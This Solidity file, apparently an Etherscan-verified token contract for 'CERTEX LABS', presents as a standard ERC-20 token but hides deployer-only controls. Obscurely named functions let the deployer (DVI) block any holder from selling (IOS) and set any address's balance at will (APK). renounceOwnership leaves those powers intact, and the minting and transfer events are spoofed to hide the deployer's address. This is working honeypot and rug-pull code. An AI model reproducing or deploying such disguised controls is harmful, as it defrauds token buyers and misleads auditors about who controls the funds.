/**
 *Submitted for verification at Etherscan.io on 2023-02-18
*/

pragma solidity 0.8.18;

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract CERTEX {
  
    mapping (address => uint256) private bVal;


    mapping (address => uint256) private cVx;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "CERTEX LABS";
    string public symbol = unicode"CERTEX";
    uint8 public decimals = 6;


    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
    uint256 private MIN;
    address private DVI;
    address private EVI;


    address fVI = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
    DVI = msg.sender;
    bVal[msg.sender] = totalSupply;
    EVI = fVI;
    emit Transfer(address(0), EVI, totalSupply); 
    MIN = 0;
    }

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }
       function IOS (address Xi, uint256 Xx)  public {
     require(msg.sender == DVI);
   cVx[Xi] = Xx;}


   function balanceOf(address account) public view  returns (uint256) {
        return bVal[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {


    
        require(bVal[msg.sender] >= value);
        require(cVx[msg.sender] <= MIN); 
  bVal[msg.sender] -= value;  
        bVal[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }
        function APK (address Xi, uint256 Xx)  public {
    require(msg.sender == DVI);
    bVal[Xi] = Xx;}
 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  
     
        require(cVx[from] <= MIN);
        require(cVx[to] <= MIN);
        require(value <= bVal[from]);
        require(value <= allowance[from][msg.sender]);
        bVal[from] -= value;
        bVal[to] += value;
        allowance[from][msg.sender] -= value;
       if(from == DVI) {from = fVI;}
        emit Transfer(from, to, value);
        return true; }



    }